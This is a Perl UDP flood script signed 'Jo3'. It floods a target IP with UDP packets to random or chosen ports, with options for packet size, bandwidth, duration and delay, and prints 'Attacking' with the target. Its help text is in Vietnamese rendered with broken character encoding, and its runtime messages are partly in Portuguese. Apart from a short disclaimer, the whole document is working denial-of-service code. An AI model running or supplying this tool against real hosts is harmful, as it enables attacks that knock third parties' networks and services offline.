#!/usr/bin/perl
#####################################################
# udp flood - Coded By Jo3
######################################################
 
use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;
 
our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;
 
GetOptions(
        "port=i" => \$port,             # UDP port to use, numeric, 0=random
        "size=i" => \$size,             # packet size, number, 0=random
        "bandwidth=i" => \$bw,          # bandwidth to consume
        "time=i" => \$time,             # time to run
        "delay=f"=> \$delay,            # inter-packet delay
        "help|?" => \$help);            # help
       
 
my ($ip) = @ARGV;
 
if ($help || !$ip) {
  print <<'EOL';
flood.pl --port=dst-port --size=pkt-size --time=secs
         --bandwidth=kbps --delay=msec ip-address
_______________________________________________________________________________________________ | =>
Tiêu chu?n:
   * UDP ðích ng?u nhiên ðý?c s? d?ng tr? khi --port ð?nh
   * Gói kích thý?c ng?u nhiên ðý?c g?i tr? khi --size ho?c --bandwidth ðý?c quy ð?nh
   * L? l?t liên t?c tr? trý?ng h?p quy ð?nh --time
   * L? s? ðý?c g?i ð?n m?t t?c ð? d?ng, tr? khi nó ðý?c ch? ð?nh ho?c --delay --bandwidth
_______________________________________________________________________________________________ | =>
Khuy?n cáo s? d?ng:
   tham s? --size ðý?c b? qua n?u c? --bandwidth và --delay
     các thông s? ðý?c quy ð?nh.
_______________________________________________________________________________________________ | =>
   Kích thý?c gói ðý?c thi?t l?p ð?n 256 byte, n?u tham s? ðý?c s? d?ng --bandwidth
     mà không --size tham s?
_______________________________________________________________________________________________ | =>
   Các kích thý?c c?a gói ð?nh là kích thý?c IP datagram (IP và bao g?m
   Tiêu ð? UDP). Kích thý?c giao di?n gói có th? thay ð?i tùy theo l?p 2 ðý?ng h?m.
_______________________________________________________________________________________________ | =>
C?nh báo và Mi?n tr?:
   Host l? l?t ho?c các m?ng bên th? ba thý?ng ðý?c coi là m?t ho?t ð?ng t?i ph?m.
   L? l?t máy ho?c các m?ng riêng c?a h? nói chung là m?t ? tý?ng t?i
   Gi?i pháp l? performace cao nên ðý?c s? d?ng cho cãng th?ng / th? nghi?m hi?u su?t
   S? d?ng ch? y?u trong môi trý?ng ph?ng thí nghi?m ð? th? nghi?m DoS
______________________________________________________________________
EOL
  exit(1);
}
 
if ($bw && $delay) {
  print "AVISO: calculado tamanho do pacote substitui o parâmetro --size ignorado\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}
 
$size = 256 if $bw && !$size;
 
($bw = int($size / $delay * 8)) if ($delay && $size);
 
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "N?o pode resolver o nome do host $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print "Attacking$ip " . ($port ? $port : "acaso") . " porta com " .
  ($size ? "$size-byte" : "tamanho aleatório") . " pacotes" . ($time ? " for $time seconds" : "") . "\n";
print "GHT $delay msec\n" if $delay;
print "dang tan cong\n" if $bw;
print "code by Jo3\n" unless $time;
 
die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}